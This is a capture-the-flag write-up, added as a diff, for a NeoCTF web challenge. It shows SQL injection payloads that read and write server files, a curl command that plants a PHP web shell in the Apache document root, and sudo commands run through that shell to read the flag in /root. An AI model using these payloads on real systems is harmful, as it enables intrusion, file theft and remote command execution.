@@ -1,0 +1,34 @@
+A hint from the NeoCTF team on their twitter said that the database did not contain anything useful, which meant
+that the flag was somewhere on the filesystem.
+
+Playing around with the form revealed that we could read and write to files arbitrarily.
+
+If we want to write to a file, all we need to do is inject:
+    1' UNION SELECT 'hi' INTO OUTFILE '/path/to/file' --
+
+If we want to read from a file, we would input:
+    1' UNION SELECT load_file('/path/to/file') --
+
+It occurred to me later on that I needed to find some way to execute commands on the server, and that I could probably
+write to a php file that could run shell commands.
+
+In order to find out where I needed to write the php file to, I looked at one of the default locations for an apache2 config:
+
+    $ curl http://45.55.51.22:8883/ --data "search=1' UNION SELECT load_file('/etc/apache2/sites-enabled/000-default.conf') -- "
+
+    ...
+    DocumentRoot /var/www/ecustomers
+    ...
+
+Now, any file we write to in /var/www/ecustomers can be requested from the server, so let's do it.
+
+    $ curl http://45.55.51.22:8883/ --data "search=1' UNION SELECT '<?php \$output = shell_exec(\$_GET[''cmd'']); echo \"<pre>\$output</pre>\" ?>' INTO OUTFILE '/var/www/ecustomers/insanee.php' -- "
+
+    $ curl http://45.55.51.22:8883/insanee.php?cmd=sudo%20ls%20/root
+        flag.txt
+        sys-auto
+
+    $ curl http://45.55.51.22:8883/insanee.php?cmd=sudo%20cat%20/root/flag.txt
+        flag{9th_and_ash_is_my_favorite}
+
+flag{9th_and_ash_is_my_favorite}
